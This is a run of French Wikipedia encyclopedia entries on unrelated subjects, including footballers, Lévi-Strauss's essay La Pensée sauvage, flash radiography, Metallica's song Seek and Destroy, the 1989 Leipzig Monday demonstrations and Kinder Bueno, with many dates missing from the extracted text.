Julien Delétraz est un footballeur français, né le à La Tronche (Isère), qui évolue aux postes de défenseur et de milieu défensif.
Biographie.
Julien Delétraz est formé au Grenoble Foot, il apparaît seulement 4 fois en équipe première en Ligue 2 et deux fois en Coupe de France.
Il signe ensuite en au Tours FC pour évoluer en National où il participe à 16 rencontres pour un but. Mais en 2008-09 pour la saison en Ligue 2, il joue peu car l'entraîneur lui préfère en défense centrale la nouvelle recrue brésilienne Júlio Santos.
En fin de contrat fin , il est laissé libre par le club tourangeau. Lors de l'intersaison 2009, il participe au stage de l'UNFP destiné aux joueurs sans contrat.
Il se lance un défi : participer à la S League à Singapour dans une équipe 100 % d'origine française, l'Etoile FC. Il joue 30 matches sur les 33 que compte le championnat de Singapour et permet à ce nouveau club de remporter pour sa première année d'existence le titre.
Il ne renouvelle pas l'expérience et quitte le club à la fin de la saison. Après une période sans club, il rejoint le Rodez Aveyron Football en , avant de retrouver son club de cœur et club formateur le Grenoble Foot 38 en .
Dès la rentrée 2014, son contrat expire et il se déplace dans l'équipe de Jura Sud Foot.
En 2016, il retourne à Grenoble, le club de ses débuts, et connaît deux saisons pleines ainsi que deux montées, retrouvant le niveau professionnel et la Ligue 2 lors de la saison 2018-2019. Après douze matchs et un statut de remplaçant, Delétraz résilie son contrat avec le GF38 lors de la période hivernal des transferts, le .
Le , il s'engage avec l'AS Cannes, pensionnaire de National 3.

</doc>
<doc id="3214677" url="https://fr.wikipedia.org/wiki?curid=3214677" title="La Pensée sauvage">
La Pensée sauvage

La Pensée sauvage est un essai de Claude Lévi-Strauss publié pour la première fois en 1962 chez Plon.
Thématique.
En utilisant le thème de l'ethnologie traditionnelle, l'auteur cherche à décrire les mécanismes de la pensée en tant qu'attribut universel de l'esprit humain. Pour lui, la pensée sauvage est présente en tout homme tant qu'elle n'a pas été cultivée et domestiquée à « fins de rendement ». Par l'utilisation de l'idée de rendement, il met en opposition l'utilité immédiate de la science et des connaissances dont a besoin la communauté pour se reproduire, avec une forme de pensée adaptée aux besoins sociaux ou de productivité des sociétés modernes. La pensée sauvage, « bricoleuse », associe les événements aux structures ; la pensée moderne, « ingénieuse », part de la structure pour créer l'événement. 
Partant de ce principe, l'évocation de thèmes tels que la science, la culture, les totems et castes, ou encore les « Catégories, Éléments, Espèces et Nombres », appuyés par de nombreuses références ethnologiques issues de l'étude de peuples primitifs variés, sont autant de moyens d'illustrer le fonctionnement de la pensée chez l'homme primitif. Mais sous ce travail ethnologique minutieux, se dissimule en réalité une tentative de démonstration que peu de chose démarque la pensée du « sauvage » de celle du « civilisé ». Qu'il est erroné d'affirmer que la différence entre la pensée primitive et la pensée moderne résiderait dans la capacité de cette dernière à appréhender la complexité ou des phénomènes complexes.
Les deux premiers chapitres intitulés « La Science du Concret » et « La Logique des Classifications Totémiques » cherchent à convaincre le lecteur de cette universalité de la pensée, et surtout de l'uniformité des capacités intellectuelles et conceptuelles des hommes quel que soit leur degré de civilisation. Le livre tente aussi de démontrer la relativité d'une supposée supériorité de la science des civilisés sur celle des archaïques. 
Ainsi, en nous expliquant dans le premier chapitre qu'il existe une science autre mais non moindre dans les sociétés dites primitives, mais dont la construction est empirique (contrairement à la science moderne, expérimentale mais aussi largement spéculative et théorique), l'auteur nous démontre que la science n'est pas l'apanage du moderne, mais qu'elle fait partie de l'histoire des hommes depuis des temps immémoriaux. 
À la suite, en nous présentant des systèmes de classification totémique dont l'existence est incontestablement archaïque, il nous prouve que le désir de classification du vivant et plus généralement de tout ce qui constitue l'univers des hommes (jusqu'aux concepts), ne correspond pas à une capacité des civilisations antiques (par exemple les systèmes de mémorisation de Cicéron), ou même modernes (systématique de Carl von Linné, combinatoire de Gottfried Wilhelm Leibniz, ou encore travaux de Francis Bacon), mais qu'il existe sans aucun doute chez les peuples de tous continents des systèmes évolués de classification et de combinaisons.
Il s'achève par un chapitre consacré à une discussion d'un livre de Jean-Paul Sartre ("Critique de la raison dialectique I"), dont il conteste le regard sur certains fondements philosophiques de l'anthropologie. 
Influence.
Publié dans les années 60, "La Pensée Sauvage" est devenu un classique de l'ethnologie. Par ailleurs son influence sur les sciences humaines et sociales est aujourd'hui considérée comme décisive. L'anthropologue brésilien Eduardo Viveiros de Castro estime qu'. 
André Comte-Sponville affirme quant à lui que dans son débat avec Sartre, Lévi-Strauss a retrouvé les termes du conflit entre Descartes et Spinoza : .
Épigraphe.
 (Honoré de Balzac, "Le Cabinet des Antiques")

</doc>
<doc id="3214679" url="https://fr.wikipedia.org/wiki?curid=3214679" title="Vieux-Port Hôtel de Ville (métro marseillais)">
Vieux-Port Hôtel de Ville (métro marseillais)



</doc>
<doc id="3214688" url="https://fr.wikipedia.org/wiki?curid=3214688" title="Jean Stanislaus Stolzmann">
Jean Stanislaus Stolzmann



</doc>
<doc id="3214689" url="https://fr.wikipedia.org/wiki?curid=3214689" title="Tombstone piledriver">
Tombstone piledriver



</doc>
<doc id="3214690" url="https://fr.wikipedia.org/wiki?curid=3214690" title="Julien Cétout">
Julien Cétout

Julien Cétout, né le à Chartres (Eure-et-Loir), est un footballeur français évoluant au poste d'arrière droit et de milieu défensif.
Biographie.
Jeunesse et formation.
Julien Cétout est né le .
D'ascendance antillaise, Julien Cétout commence le football dans le club de sa ville natale, le FC Chartres. Il y joue de douze à quinze ans avant d'intégrer l'INF Clairefontaine.
Ce jeune milieu défensif au physique imposant ( pour ) rejoint le centre de formation de l'AS Saint-Étienne en 2004. Il est sélectionné dans les équipes de jeunes françaises (9 sélections en U15 et 15 en U16) et est promis à un bel avenir, mais se blesse en fin de saison 2006-2007. Il joue cinquante matchs avec l'équipe réserve. Il n'est pas conservé à l'orée de la saison 2008-2009 et rejoint le Tours FC, promu en Ligue 2, entraîné par un ancien stéphanois, Daniel Sanchez.
Tours FC (2008-2014).
Au Tours FC, Julien Cétout s’impose comme titulaire indiscutable dès la saison suivante.
Après la saison 2011-2012 avec le Tours FC, Julien Cétout souffre d'une rupture des ligaments croisés du genou gauche qui l'éloigne six mois des terrains. C'est la seconde fois de sa carrière qu'il subit cette lourde blessure, la première fois fut au genou droit lors de son passage au centre de formation à Saint-Étienne. Cétout est alors en fin de contrat en juin 2012 et le club tourangeau souhaite le prolonger. Il signe pour un contrat d'un an plus une année.
Le au Stade de la Vallée du Cher, pour le compte de le de Ligue 2 contre Caen (1-1), Julien Cétout marque son premier but de sa carrière d'une frappe du pied gauche.
Lors de la saison 2013-2014, il passe la saison à divers postes dans le onze tourangeau, performance qui ne passe pas inaperçue, d'où l'intérêt de plusieurs clubs de Ligue 1. Milieu de terrain défensif, il dépanne parfois comme arrière droit et figure même à ce poste dans l’équipe type de la saison 2013-2014 par "France Football".
AS Nancy-Lorraine (2014-2018).
Arrivé en fin de contrat au Tours FC, Julien Cétout signe à l’AS Nancy-Lorraine pour trois ans à 26 ans. Pour sa première saison en Lorraine, il dispute 31 matchs de championnat. Après 19 journées de Ligue 2 de l'exercice 2015-2016, il est déjà à six buts marqués pour deux passes décisives données. Fort de ses bonnes performances et de sa place de titulaire incontestable dans son nouveau poste d'arrière droit, en , son contrat est prolongé jusqu'en 2019.
Hapoël Beer-Sheva (2018).
Le , il s'engage pour deux saisons avec l'Hapoël Beer-Sheva.
Le , il résilie son contrat.
Palmarès.
Club.
 AS Nancy-Lorraine
Condamnation judiciaire.
Le 2 mars 2017, Julien Cétout est placé en garde à vue à la suite de violences conjugales, survenues à la suite d'une dispute avec sa compagne. Le 16 mai 2017, le joueur est condamné par le tribunal de Nancy à trois mois de prison avec sursis et à payer 3 500 € de dommages et intérêts à sa compagne.

</doc>
<doc id="3214698" url="https://fr.wikipedia.org/wiki?curid=3214698" title="Calocère cornue">
Calocère cornue

La Calocère cornue ou Calocère cornée ("Calocera cornea") est une espèce de champignons gélatineux d'apparence jaune, ornés de petites cornes.
Description.
Le champignon est assez commun et pousse sur des bois morts de feuillus (de préférence hêtre) et plus rarement sur des conifères.
La calocère cornée a la forme de petites pointes gélatineuses simples. Un peu collante par temps humide, elle est de couleur jaune (jeune) à orangé safran (plus vieux) alors que sa sporée est blanche. Ce champignon pousse en été et en automne. Haut de 0,5 à 2 cm pour 1 millimètre d'épaisseur à la base, droit, cylindrique s'amenuisant en pointes vers le haut, généralement non ramifiée mais souvent issue d'une base commun. Sa chair est glabre, visqueuse et élastique.
Parmi les espèces proches se trouvent "Calocera glossoides", "Calocera pallidospathulata" et surtout la calocère visqueuse qui est plus grande et dont les pointes sont ramifiées. Les clavaires poussent au niveau du sol.
Comestibilité.
Ce champignon n'a pas la réputation d'être toxique ou vénéneux bien qu'il soit classé comme non comestible.

</doc>
<doc id="3214701" url="https://fr.wikipedia.org/wiki?curid=3214701" title="Radiographie éclair">
Radiographie éclair

La radiographie éclair ("« »") est une technique de radiographie utilisant des impulsions de rayons X. Elle permet de visualiser des phénomènes rapides qui se déroulent dans des corps opaques ou entourés de lumière visible intense. Ses applications concernent essentiellement la balistique et la détonique.
En général, les objets se déplaçant rapidement tels que des ondes de détonation ou des projectiles dans des canons, sont animés d'une vitesse de quelques kilomètres par seconde. Parmi les moyens d'observation les plus importants se trouve la radiographie éclair qui consiste à produire une impulsion de rayons X, d'une durée d'environ 10 nanosecondes, suffisamment intense pour impressionner un film radiographique. L'impulsion de rayons X est synchronisée avec le phénomène à observer.
Pour produire ces impulsions de rayons X on utilise des techniques très différentes de celles employées en radiographie classique. Le tube de radiographie éclair comporte une cathode froide capable d'émettre des électrons par émission de champ et une anode en tungstène de forme conique pour assurer une source de rayonnement X ponctuelle. Aucun refroidissement n'est nécessaire. Entre les deux électrodes situées dans le vide, on fait passer un courant pouvant atteindre un million d'ampères, produit par exemple par un générateur de Marx (condensateurs chargés en parallèle puis déchargés en série) produisant une tension de plusieurs centaines de kilovolts au niveau de l'anode.
En France, le CEA Valduc dispose de ce type d'installation (EPURE) dans le cadre du programme TEUTATES, en partenariat avec la Grande-Bretagne, à la suite des Traités de Londres (2010), connu aussi sous le nom d'Accords de Lancaster House. L'outil de radiographie Airix permet d’optimiser les modèles de physique utilisés pour simuler numériquement les premières phases du fonctionnement des armes nucléaires, afin d'en garantir la fiabilité, à la suite de la ratification en 1998 par les deux pays du Traité d’Interdiction Complète des Essais nucléaires [TICE].

</doc>
<doc id="3214702" url="https://fr.wikipedia.org/wiki?curid=3214702" title="John C. Malone">
John C. Malone

John C. Malone, né le à Milford (Connecticut), est un homme d'affaires américain. Il est le directeur général et actionnaire majoritaire de Liberty Media, Liberty Global &amp; Discovery Holding Company.
Biographie.
Il obtient son baccalauréat en 1959 de à New Haven. Il va à l'université Yale et obtient un « B.A. in Electrical Engineering and Economics » (équivalent à une licence universitaire française) en 1963. Malone commence, la même année, aux Laboratoires Bell.
Ensuite il est directeur de la "National Cable &amp; Telecommunications Association" (NCTA) de 1974 à 1977 puis de 1980 à 1993.
Il dirige aussi de 1973 à 1996 Tele-Communications Inc. (TCI). Malone devient alors un des hommes les plus influents des médias américains. En 1998, il vend Tele-Communications Inc. à AT&amp;T pour 15 milliards de dollars.
Il siège aussi au conseil d'administration dans la banque de New York Cato Institute, The Nature Conservancy, Expedia.
En 2008, Liberty Media achète DirecTV pour la somme de 78,3 millions de dollars (Greg Maffei en est directeur).
Il est au classement "Forbes" en 2004 « World's Richest People 2004 ».
Il est, en 2020, le plus grand propriétaire foncier des États-Unis.
Il donne plus de pour soutenir la campagne électorale de Donald Trump en 2020.

</doc>
<doc id="3214704" url="https://fr.wikipedia.org/wiki?curid=3214704" title="Leioheterodon madagascariensis">
Leioheterodon madagascariensis

Leioheterodon madagascariensis est une espèce de serpents de la famille des Lamprophiidae.
Son nom malgache est Menarana (prononcé "ménarane").
Répartition.
Cette espèce se rencontre :
Étymologie.
Son nom d'espèce, composé de "madagascar(i)" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte.

</doc>
<doc id="3214709" url="https://fr.wikipedia.org/wiki?curid=3214709" title="Climat de la Réunion">
Climat de la Réunion



</doc>
<doc id="3214710" url="https://fr.wikipedia.org/wiki?curid=3214710" title="Guillaume de Montferrat">
Guillaume de Montferrat

Plusieurs souverains de Montferrat se sont appelés Guillaume :
D'autres personnes ont également porté ce nom :

</doc>
<doc id="3214713" url="https://fr.wikipedia.org/wiki?curid=3214713" title="Église Saint-Mammès de Dannemois">
Église Saint-Mammès de Dannemois

L'église Saint-Mammès est une église paroissiale de culte catholique, dédiée au martyr cappadocien Mammès de Césarée, située dans la commune française de Dannemois et le département de l'Essonne.
Situation.
L'église Saint-Mammès est implantée au centre du village de Dannemois, sur la rive gauche de la rivière l'École, à proximité directe du château de la Louvetière, ancienne possession de l'Ordre du Temple, face à une grand-place en herbe.
Historique.
Le début de la construction remonte au pour la nef, complétée au par le clocher et au par le chœur.
Une commanderie de l'Ordre du Temple était installée à proximité, il en subsiste deux tombes de templiers.
Au un portail latéral fut percé, protégé par un auvent, donnant une allure caractéristique à l'édifice.
Le , le chœur qui représentait la moitié de la surface de l'église s'effondra. Le , la nef et le clocher subsistant furent inscrits au titre des monuments historiques.
Description.
L'église est bâtie en grès de Fontainebleau. Au fut construite dans un style roman la nef massive de plan carré couverte d'une voûte en berceau. Au fut élevé le clocher ajouré par des baies romanes géminées. Au s'ajoutait le bas-côté sud à deux travées voûtées. Au fut ajouté à l'est le chevet accueillant le chœur dans un style gothique. Au furent ajoutés des butées en grès pour consolider le pignon et le bas-côté, un second portail fut percé, protégé par un auvent prolongeant la toiture. En 1900, le chœur s'effondra, ne laissant que les ruines du chevet. Les fonts baptismaux sont en grès sculpté.

</doc>
<doc id="3214717" url="https://fr.wikipedia.org/wiki?curid=3214717" title="Leioheterodon">
Leioheterodon

Leioheterodon est un genre de serpents de la famille des Lamprophiidae. 
Répartition.
Les espèces de ce genre se rencontrent sur l'île de Madagascar et quelques îles environnantes dans l'archipel des Comores.
Liste d'espèces.
Selon :

</doc>
<doc id="3214718" url="https://fr.wikipedia.org/wiki?curid=3214718" title="Within Dividia">
Within Dividia

Within Dividia est le deuxième album studio du groupe de Metalcore/Mathcore Canadien The End.
Cet album est un peu plus long que son prédécesseur, , bien qu'il soit quand même assez court (il dure un peu plus d'une demi-heure, alors que dure à peine plus de vingt minutes).
Within Dividia est sorti le sous le label Relapse Records.

</doc>
<doc id="3214722" url="https://fr.wikipedia.org/wiki?curid=3214722" title="Seek and Destroy (chanson)">
Seek and Destroy (chanson)

Seek and Destroy est la du premier album du groupe Metallica, "Kill 'Em All", sorti en . Elle a été écrite par Hetfield et Ulrich, les deux principaux compositeurs du groupe. La chanson dure 6 min 56 et demeure à ce jour la quatrième chanson la plus jouée en concert par le groupe avec "Creeping Death", "One", "Master Of Puppets" et "Enter Sandman".
"Seek and Destroy" est une des chansons phares du groupe et son riff préfigure la marque de fabrique Metallica.
Toujours en concert Hetfield change le début des paroles : « "in the city tonight" » devient « "the city..." » avec le nom de la ville dans laquelle ils jouent ce morceau.
La chanson parle de l'urgence de tuer et on peut déduire des paroles que ce n'est pas une tuerie insensée mais comme une revanche à quelqu'un qui l'a beaucoup mérité. Pendant le "Kill 'Em All Tour", Hetfield a déclaré que ça parlait de chasse, de poursuite. On dit aussi que le morceau aurait été influencé par une chanson des Diamond Head, "Dead Reckoning".
Une interprétation de la chanson avec Burton à la basse en 1985 est disponible sur le DVD "Cliff 'Em All". De nouvelles versions live peuvent être trouvées dans le "Live Shit: Binge and Purge" avec Newsted chantant le morceau et le DVD "Cunning Stunts".
C'est aussi le thème de l'ancien "World Championship Wrestling" et du "Total Nonstop Action Wrestling" et dans le cas de ce dernier la chanson était un enregistrement en public pris pendant le festival de Woodstock en 1999. Le lutteur Sting (présent dans les deux shows qui utilisèrent "Seek and Destroy") utilisa lui aussi le riff du début de la chanson pour faire son entrée. L'équipe de hockey des Sharks de San José utilise la chanson comme leur chanson d'entrée sur le terrain pendant leurs matchs.
Depuis "Kill 'Em All", Hammett s'excuse du ton inhabituel de l'accord qui se produit à la 47 pendant le solo, et est en fait une erreur. Durant le documentaire réalisé sur Metallica "Some Kind of Monster", la chanson est entendue dans le court-métrage sur le groupe relatant leurs premières années, celui-ci met en évidence la progression du groupe et de leur son au fil des années. Dans ce documentaire, la chanson a été souvent utilisée dans les auditions pour remplacer Newsted. Dans le livre "Metallica: This Monster Lives", un des réalisateurs du film a dit qu'au départ le montage était fluide, mais qu'il a été modifié pour mettre en valeur les changements du groupe dans le temps.
La chanson a été reprise par Chuck Billy, Jake E. Lee, Jimmy Bain, et Aynsley Dunbar pour l'album "Metallic Assault: A Tribute to Metallica". La chanson a aussi été reprise par des groupes tels que Testament et Acid Drinkers et instrumentalement par Freaklabel comme faisant partie d'un medley. Apocalyptica et Pantera l'ont aussi reprise mais uniquement en public. Ainsi que le groupe de metal français "Demon Eyes" dans l'album" Garde à vue" où le groupe rend hommage à Cliff Burton.
Les trois premiers mini solos de la chanson sont dérivés de la chanson "Princess of the Night" du groupe Saxon. Metallica a ajouté le solo final.
Dans le sport.
Cette chanson était également le thème musical de Sting, ancien catcheur retraité de la WCW, de la TNA, de la WWE et de l'AEW, et de Cibernético, ancien catcheur AAA. Dans le cas de Sting, il s'agissait d'un enregistrement live de Woodstock '99, inclus dans la compilation "« WCW Mayhem: The Music »" de 1999. Sting l'a utilisée pour deux de ses matchs en carrière en All Elite Wrestling, lors du All In Londres au stade de Wembley, et pour son match de retraite à Revolution (2024).
Depuis 2013, les Sharks de San José, de la Ligue nationale de hockey (LNH), utilisent « Seek &amp; Destroy » comme thème d'entrée, car de nombreux membres du groupe sont des supporters des Sharks.

</doc>
<doc id="3214735" url="https://fr.wikipedia.org/wiki?curid=3214735" title="Manifestations du lundi">
Manifestations du lundi

 
Les « ' » (ou manifestations du lundi) sont un élément essentiel du tournant décisif imposé à l'automne 1989 par les citoyens opposés au gouvernement du régime communiste de la RDA (la République démocratique allemande, appelée aussi Allemagne de l'Est). Le slogan () a rassemblé, semaine après semaine, des centaines de milliers d'habitants en protestation contre la politique du gouvernement et contre le système alors en place de Karl-Marx-Platz, d’abord à Leipzig, puis dans de nombreuses villes de RDA. Ces manifestations non violentes ont débouché sur la chute du mur de Berlin et la réunification allemande.
Historique.
Des prières pour la paix à l’église Nicolas de Leipzig ont été organisées par les pasteurs et , dès le milieu des années 1980.
L’objectif était de proposer une réorganisation pacifique et démocratique du pays, en particulier du pouvoir politique du Parti socialiste unifié d'Allemagne (le "" - SED), c'est-à-dire du parti communiste, au pouvoir depuis 1949. La première des grandes manifestations eut lieu le . La police de la RDA réprima avec violence les manifestations avant les festivités du de la RDA, les 7 et .
À l'origine, il s'agit d'un regroupement spontané d'étudiants à l'occasion de la foire de Leipzig qui accueillait des entreprises occidentales chaque année en septembre. Quelques banderoles à l'intention des occidentaux et en particulier des journalistes indiquaient par exemple cette revendication : pouvoir voyager librement. La Stasi (police politique), réprima brutalement les manifestants et le lendemain, dans la presse locale, ils étaient qualifiés de « voyous ». Un pasteur de l'Église luthérienne, membre de la Fédération des Églises protestantes de la RDA, proposa pour le lundi suivant une prière pour la paix. Vexés d'avoir été traités de voyous, les étudiants vinrent nombreux. Après la prière, les fidèles défilèrent dans la ville en criant : . Puis, devant la ferveur de la prière collective, le pasteur proposa de revenir tous les lundis soir. Chaque lundi, le nombre de fidèles et de futurs manifestants s'est accru. L'exemple polonais, où l'Église catholique était à la pointe du combat pour la liberté devint contagieux.
Entretemps, des centaines de citoyens de RDA se réfugièrent à l'ambassade de RFA à Prague et obtinrent de passer à l'Ouest dans des trains spéciaux qui devaient traverser la RDA. Ces transferts ont provoqué d'importants mouvements de foule dans toutes les gares de passage des trains, ce qui augmenta la mobilisation.
Le , manifestent en criant : (), et passent devant le siège de la Stasi sans provocation : des bougies sont allumées sur les marches du bâtiment. Le secrétaire local du Parti communiste, qui avait reçu les pleins pouvoirs du bureau politique, demande néanmoins des instructions à Berlin-Est. En effet, il avait été informé quelques jours auparavant qu'Egon Krenz cherchait à remplacer Erich Honecker par une révolution de palais. Ne recevant aucune instruction, et après intervention de Kurt Masur, célèbre chef d'orchestre du Gewandhaus de Leipzig, il interdit aux forces paramilitaires présentes de faire usage de leurs armes. Le processus d'effondrement du régime commence.
Des dirigeants importants, comme Wolfgang Berghofer, bourgmestre de Dresde, ou Markus Wolf, ancien chef des services secrets, prennent ouvertement parti pour les manifestants. Cette pression a conduit à la chute du mur de Berlin le , marquant la chute imminente du régime socialiste de la RDA.

</doc>
<doc id="3214743" url="https://fr.wikipedia.org/wiki?curid=3214743" title="Anséric">
Anséric

Anséric est un nom propre.
Prénom.
Anséric est un prénom masculin désuet.

</doc>
<doc id="3214746" url="https://fr.wikipedia.org/wiki?curid=3214746" title="Ken Tagawa">
Ken Tagawa

, né à Nagasaki, est un artiste japonais.
Nombre de ses estampes représentent des scènes de Nagasaki, notamment les immeubles de style occidental.

</doc>
<doc id="3214749" url="https://fr.wikipedia.org/wiki?curid=3214749" title="G.Georges - Mianes">
G.Georges - Mianes



</doc>
<doc id="3214752" url="https://fr.wikipedia.org/wiki?curid=3214752" title="Église Sainte-Madeleine de Pallier">
Église Sainte-Madeleine de Pallier

L’église Sainte-Madeleine de Pallier (lieu-dit « Paillier ») est située à Gentioux-Pigerolles (Genciòus en occitan) dans le département de la Creuse et la région Nouvelle-Aquitaine. Elle fait l'objet d'une inscription aux monuments historiques depuis 1974
Description.
À proximité de la maison de notaire royal, c'était une dépendance de l'ancienne commanderie de Charrières au temps des Hospitaliers et qui a peut-être auparavant appartenu aux templiers. La maison de notaire, classée monument historique depuis 1996, est un bâtiment qui fut construit à l'initiative d'Alexis Jabouille, notaire royal, en 1760. Il avait une vocation agricole jusqu'aux années 1980 du .
Situé juste au-dessus, la chapelle date du , elle est juste à côté du cimetière où l'on peut voir des dalles funéraires gravées de la croix de Malte. On peut y voir aussi une croix avec le Christ d'un côté et la Vierge Marie de l'autre.
On peut aussi visiter à proximité une reconstitution d'un jardin médiéval, avec ses plantes aromatiques et médicinales, ses roses, son "arbre de vie".
Historique.
L'édifice date du mais a connu d'importants travaux de reconstruction en 1555.
À la fin du , la maison de notaire royal était devenue des chambres d'hôtes baptisées « commanderie de Pallier » et qui a cessé ses activités en 2008. Ce nom porte à confusion car le chef-lieu de la commanderie fut en fait à Gentioux puis à Saint-Moreil.

</doc>
<doc id="3214753" url="https://fr.wikipedia.org/wiki?curid=3214753" title="Gatis Smukulis">
Gatis Smukulis

Gatis Smukulis, né le à Valka, est un coureur cycliste letton. Professionnel de 2009 à 2018, il a remporté six championnats de Lettonie du contre-la-montre consécutifs, de 2011 à 2016.
Biographie.
Jeunesse et carrière amateur.
Gatis Smukulis commence le cyclisme lorsqu'il reçoit un vélo à l'âge de dix ans. 
Champion de Lettonie du contre-la-montre en catégorie cadet en 2003, puis junior en 2004, il s'illustre en 2005 avec 37 victoires, dont le Trofeo Karlsberg, manche de la Coupe du monde UCI Juniors, ainsi que le Giro di Basilicata, le Tour d'Istrie et le Tour de la région de Łódź.
Entraîné par Arvis Piziks, il arrive en France l'année suivante, dans l'équipe Lotus-MBK-UC Sud Luberon. Il remporte la première étape du Tour du Gévaudan, et les titres de champion de Lettonie espoirs sur route et du contre-la-montre. En 2007, il rejoint le Vélo-Club La Pomme Marseille. Il aide ce club à remporter la coupe de France des clubs, notamment en gagnant l'un de ses manches, Chambord-Vailly. Avec l'équipe de Lettonie, il gagne le Grand Prix Guillaume Tell, course de la Coupe des Nations U23. Il termine cette saison à la première place du classement FFC. En 2008, il réalise un nouveau doublé aux championnats de Lettonie espoirs, et remporte le Tour des Flandres espoirs (Coupe des Nations U23), les Boucles du Sud Ardèche, Bordeaux-Saintes, le Tour du Canton de Saint-Ciers et une étape de la Ronde de l'Isard d'Ariège. Il participe aux Jeux olympiques de Pékin, où il représente la Lettonie lors de la course en ligne, avec Raivis Belohvoščiks, et en prend la après avoir pris part à l'échappée de 26 coureurs en début de course.
Début de carrière professionnelle.
Gatis Smukulis devient professionnel dans l'équipe française AG2R La Mondiale en 2009.
En 2011, il rejoint l'équipe américaine HTC-Highroad. En mars, il gagne la première étape du Tour de Catalogne et occupe pendant deux jours la première place du classement général de cette course. Trois mois plus tard, il obtient son premier titre de champion de Lettonie du contre-la-montre élite.
Chez Katusha de 2012 à 2015.
À l'issue de cette saison, HTC-Highroad disparaît. Gatis Smukulis est engagé pour la saison 2012 par l'équipe russe Katusha. Après avoir débuté dans cette formation au Tour Down Under en Australie, il dispute le Tour du Qatar, où une chute lui cause une fracture du scaphoïde. Il dispute durant cette saison ses deux premiers grands tours, les Tours d'Italie et d'Espagne, aux côtés du leader de l'équipe Joaquim Rodríguez. Une semaine après l'arrivée de la "Vuelta", il participe pour la première fois aux épreuves élite des championnats du monde sur route. Il prend avec ses coéquipiers la septième place du nouveau championnats du monde du contre-la-montre par équipes de marque, puis représente la Lettonie au contre-la-montre () et à la course en ligne ().
En 2013, il participe pour la première fois au Tour de France, où il est chargé d'épauler Rodríguez dans la plaine.
En 2015, il chute lors de Paris-Roubaix et se fracture le coude. En juin, il représente la Lettonie aux Jeux européens. Il s'y classe septième du contre-la-montre et quinzième de la course en ligne. Il obtient quelques jours plus tard son cinquième titre consécutif de champion de Lettonie du contre-la-montre. Durant l'été, il gagne le contre-la-montre par équipes du Tour d'Autriche avec Katusha. Au Tour de Pologne, il est échappé avec les Polonais Maciej Bodnar et Kamil Zielinski lors de la quatrième place, et s'incline au sprint face à ces deux coureurs. Il dispute ensuite le Tour d'Espagne, puis les trois épreuves masculines des championnats du monde sur route.
Chez Astana en 2016.
Fin 2015, il signe un contrat pour une saison avec l'équipe Astana.
Chez Delko-Marseille Provence-KTM en 2017.
Au mois d'octobre 2016, il signe un contrat avec l'équipe continentale professionnelle française Delko-Marseille Provence-KTM.
Palmarès et classements mondiaux.
Résultats sur les grands tours.
Tour de France.
2 participations
Tour d'Italie.
1 participation
Tour d'Espagne.
3 participations
Classements mondiaux.
Légende : nc = non classé

</doc>
<doc id="3214756" url="https://fr.wikipedia.org/wiki?curid=3214756" title="Le Tour d'écrou (opéra)">
Le Tour d'écrou (opéra)



</doc>
<doc id="3214758" url="https://fr.wikipedia.org/wiki?curid=3214758" title="Sam Mack">
Sam Mack

Sam Mack (né le à Chicago, Illinois) est un joueur américain de basket-ball qui évolua notamment en NBA.
Arrière shooteur de 2,00 mètre issu de l'université de Houston, il porta le maillot de cinq équipes NBA en sept ans. Depuis 2001, il a joué en CBA et avec l'équipe de Calpe Aguas en championnat d'Espagne. Mack fut sélectionné dans la draft 2005 de la "All-American Professional Basketball League", mais la ligue disparut peu de temps après.

</doc>
<doc id="3214759" url="https://fr.wikipedia.org/wiki?curid=3214759" title="Kinder Bueno">
Kinder Bueno

Kinder Bueno est une marque commerciale apposée sur une barre chocolatée fabriquée par le groupe d'industrie agroalimentaire Ferrero. Cette marque est une déclinaison de la marque « Kinder ».
Histoire.
Initialement lancé en Italie en 1990, le groupe Ferrero l'a étendu à l'Amérique latine (Brésil, Argentine et Mexique), à la Malaisie, à Israël et à la Grèce, au milieu des années 1990, puis en Allemagne, France en 1991 et en Espagne à partir de 1999. Depuis 2004, ce produit est aussi commercialisé en Grande-Bretagne et au Canada.
Aujourd'hui, cette marque est première en volume de vente de barre chocolatée en France.
À partir de 2006, le groupe Ferrero commercialise une nouvelle marque (Kinder Bueno White) pour une déclinaison de ce produit. Celui-ci est aujourd'hui commercialisé en Espagne, Portugal, Italie, France, Lituanie, Irlande du Nord, Croatie, République tchèque, Slovénie, Irlande, Pologne, Grèce, Hongrie, Allemagne, Pays-Bas, Belgique, Finlande, La Réunion, Liban et en Australie.
Ces transformations agro-alimentaires sont fabriquées dans l'usine du groupe Ferrero de Villers-Écalles (Seine-Maritime), lieu où se fabriquent également des transformations sucrées de marque Nutella.
Une édition limitée à la noix de coco a également été commercialisée, de même qu'une version au chocolat noir.
Composition.
Composition Kinder Bueno.
Chocolat au lait 31,5 % (sucre, beurre de cacao, pâte de cacao, lait écrémé en poudre, beurre concentré, émulsifiants: lécithines [soja], vanilline), sucre, huile de palme, farine de froment, noisettes broyées 10,8 %, lait écrémé en poudre, lait en poudre, chocolat noir (sucre, pâte de cacao, beurre de cacao, émulsifiants: lécithines de soja, vanilline), cacao maigre, émulsifiants: lécithines [soja], poudres à lever (carbonate acide de sodium, carbonate acide d’ammonium), sel, vanilline synthétique.
Composition Kinder Bueno White.
Chocolat blanc 28 % (beurre de cacao, sucre, lait écrémé en poudre, beurre concentré, émulsifiants : lécithine de soja, arôme), sucre, huile de palme, farine de froment, lait écrémé en poudre, lait en poudre, noisettes broyées 5 %, lactosérum en poudre, amidon de froment, cacao maigre 0,4 %, huile de tournesol, protéines de lait, émulsifiants : lécithine de soja, poudres à lever (carbonate acide d'ammonium, carbonate acide de sodium, arômes, sel.&lt;br&gt;
Valeurs nutritionnelles.
Pour :
"D'après l'étiquette d'un produit acheté en 2020 :"
Pour :
Une pièce : 21.5 g, 122 kcal
Un sachet : 43 g, 244 kcal
Fabrication.
En fin de cuisson, des gaufrettes sont fourrées d’une pâte fraîchement préparée puis plongée dans un bain de chocolat. Toute imperfection de cette friandise entraîne la mise à l’écart du produit qui sera recyclé en farine pour l’alimentation animale.
Publicité.
Dans les années 2000, le joueur de tennis Jo-Wilfried Tsonga apparaît pour une campagne publicitaire Kinder Bueno.

</doc>
<doc id="3214760" url="https://fr.wikipedia.org/wiki?curid=3214760" title="Accouplement (biologie)">
Accouplement (biologie)

L’accouplement est le terme utilisé en biologie pour désigner le rapprochement de deux individus sexuellement complémentaires aboutissant à une reproduction sexuée.
Modes d'accouplement.
